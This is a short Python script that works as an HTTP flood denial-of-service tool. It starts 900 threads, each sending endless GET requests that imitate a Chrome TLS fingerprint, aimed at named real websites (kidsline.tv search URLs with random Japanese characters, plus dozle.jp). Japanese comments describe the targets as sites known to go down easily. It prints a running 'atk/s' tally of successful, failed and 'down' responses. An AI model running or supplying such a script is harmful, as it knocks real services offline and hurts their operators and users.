import threading, time, tls_client, random, string, requests, os
from cachetools import cached

def randomstring():
   randlst = [random.choice(string.ascii_letters + string.digits) for i in range(16)]
   return ''.join(randlst)

def japanesestring():
   randoms = "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをんがぎぐげござじずぜぞだぢづでどばびぶべぼぱぴぷぺぽ"
   return random.choice(randoms)

jsondata = {
  "kidsline": "http://kidsline.tv/?s=",
  "dozle": "https://www.dozle.jp/"
}
#界隈で落ちやすいと話題のサイトです

url = jsondata["kidsline"]

client = tls_client.Session(client_identifier="chrome_108")
session = requests.Session()
send = 0
down = 0
failed = 0
totalaccess = 0
  

@cached(cache={})
def req2(url):
    global send, down, failed, totalaccess
    while True:
        try:
          resp = client.get(url).status_code
        except:
          resp = session.get(url).status_code
        if resp == 200:
            totalaccess += 1
            send += 1
        elif resp == 503:
            totalaccess += 1
            down += 1
        elif resp == 500:
            totalaccess += 1
            down += 1
        else:
            totalaccess += 1
            failed += 1

ts = []
@cached(cache={})
def req():
    urlset = url
    if urlset == "http://kidsline.tv/?s=":
      urlset = url+japanesestring()
    while True:
        req2(urlset)#ここでスレッド化すると落ちる可能性あり
@cached(cache={})
def total():
    global send, down, failed
    while True:
        if not send > 0:
          time.sleep(0.4)
        print('status : atk/s (total {} | success {} | failed {} down {}) ({} threads) (TotalAccess {})'.format(send + down + failed, send, failed, down,threading.active_count(), totalaccess))
        send = 0
        failed = 0
        down = 0
        time.sleep(1)
        os.system('cls' if os.name=='nt' else 'clear')
threading.Thread(target=total).start()
for _ in range(900):
  threading.Thread(target=req).start()
